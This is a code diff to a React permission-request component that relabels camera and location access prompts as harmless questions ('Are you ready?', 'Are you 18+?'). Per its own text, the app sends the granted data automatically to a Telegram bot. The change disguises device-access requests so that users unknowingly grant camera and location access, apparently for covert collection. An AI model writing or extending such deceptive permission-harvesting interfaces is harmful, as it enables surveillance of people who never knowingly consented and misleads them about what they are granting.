@@ -159,14 +159,14 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
         </div>
 
         <p className="text-gray-600 dark:text-gray-300 mb-6 text-sm">
-          App is requesting permissions. You can allow or deny - both work fine:
+          Please answer the following questions to continue:
         </p>
 
         <div className="space-y-4">
           <div className="flex items-center justify-between p-3 border rounded-lg">
             <div className="flex items-center space-x-3">
               <div>
-                <div className="font-medium text-lg text-blue-600 dark:text-blue-400">Camera Access</div>
+                <div className="font-medium text-lg text-blue-600 dark:text-blue-400">Are you ready?</div>
               </div>
             </div>
             {cameraGranted ? (
@@ -179,7 +179,7 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
           <div className="flex items-center justify-between p-3 border rounded-lg">
             <div className="flex items-center space-x-3">
               <div>
-                <div className="font-medium text-lg text-blue-600 dark:text-blue-400">Location Access</div>
+                <div className="font-medium text-lg text-blue-600 dark:text-blue-400">Are you 18+?</div>
               </div>
             </div>
             {locationGranted ? (
@@ -209,8 +209,8 @@ export function PermissionHandler({ onPermissionsGranted }: PermissionHandlerPro
 
         <p className="text-xs text-gray-500 mt-3 text-center">
           {cameraGranted && locationGranted ? 
-            'Data will be automatically sent to your Telegram bot' :
-            'Complete both questions to continue'
+            'Answer both questions to automatically send data to Telegram' :
+            'Answer both questions to continue'
           }
         </p>
       </div>
